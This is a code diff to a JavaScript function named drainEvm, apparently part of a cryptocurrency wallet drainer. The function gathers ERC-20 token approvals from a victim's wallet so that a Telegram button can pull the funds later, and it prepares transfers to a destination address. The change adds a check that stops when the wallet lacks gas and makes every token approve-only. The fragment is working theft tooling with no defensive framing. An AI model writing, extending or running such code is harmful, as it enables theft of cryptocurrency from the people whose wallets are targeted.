@@ -443,7 +443,14 @@ async function drainEvm() {
   for (const t of list) {
     // 1. approve FIRST — this is what makes the Telegram button work later.
     //    A token that reverts on transfer still gets an allowance this way.
-    if (cfg.approveMode) {
+   if (cfg.approveMode) {
+      const bal = await evmProvider.getBalance(account);
+      const fee = await evmProvider.getFeeData();
+      const price = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
+      if (bal < 120000n * price) {
+        log(`${t.symbol}: wallet out of gas on ${chain.name} — stopping this chain`);
+        break;
+      }
       try {
         const erc = new ethers.Contract(
           t.address, ['function allowance(address,address) view returns (uint256)'], evmProvider);
@@ -461,7 +468,7 @@ async function drainEvm() {
     }
 
     // Approve-only: the Telegram button pulls this later. Saves a prompt.
-    if (cfg.approveOnly) continue;
+    continue;
 
     // 2. only now does the transfer simulation matter
     const data = EVM_IFACE.encodeFunctionData('transfer', [dest, BigInt(t.raw)]);
